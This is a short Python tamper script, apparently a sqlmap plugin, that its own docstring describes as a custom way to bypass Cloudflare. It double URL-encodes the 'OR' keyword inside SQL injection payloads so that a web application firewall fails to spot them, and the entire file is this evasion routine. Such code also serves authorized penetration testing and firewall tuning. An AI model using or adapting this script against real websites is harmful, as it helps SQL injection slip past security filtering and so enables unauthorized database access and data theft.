#!/usr/bin/env python
# cloudflareor.py
# @dualfade

import re

def tamper(payload, **kwargs):
    """
    Replaces ('OR') with '%36%66R'

    Notes:
        * 011120221
        * Custom script to bypass CloudFlare
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"\b(OR)\b", retVal):
            if len(match.group(0)) > 1:
                s = match[0].lower()
                # urlencodeall --
                e = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in s[0])

                # urlencode each encoded char --
                x = e.split("%")
                y = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in x[1])
                z = "".join(["{}".format(y), "R"])
                retVal = retVal.replace(match.group(1), z)

            else:
                pass

        # ret --
        return retVal
